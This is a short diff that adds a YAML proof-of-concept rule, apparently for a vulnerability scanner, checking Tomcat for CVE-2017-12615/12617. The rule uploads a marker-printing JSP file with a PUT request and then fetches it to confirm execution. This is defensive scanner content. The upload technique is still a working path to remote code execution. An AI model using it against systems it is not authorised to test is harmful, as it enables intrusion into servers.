@@ -1,0 +1,21 @@
+name: poc-yaml-tomcat-rce-2017-12615-12617
+rules:
+  - method: PUT
+    path: /264aa958c066b6f3d97fac16d4b96714.jsp/
+    body: <%out.println("67df8ab758045d703e78648667377355");%>
+    follow_redirects: false
+    expression: |
+      status==200 || status == 201
+  - method: GET
+    path: /264aa958c066b6f3d97fac16d4b96714.jsp
+    follow_redirects: false
+    expression: |
+      status==200 && body.bcontains(b'67df8ab758045d703e78648667377355')
+
+
+detail:
+  author: JingLing(https://hackfun.org/)
+  links:
+    - https://paper.seebug.org/398/
+    - https://xz.aliyun.com/t/6419
+    - http://vulapps.evalbug.com/t_tomcat_1/
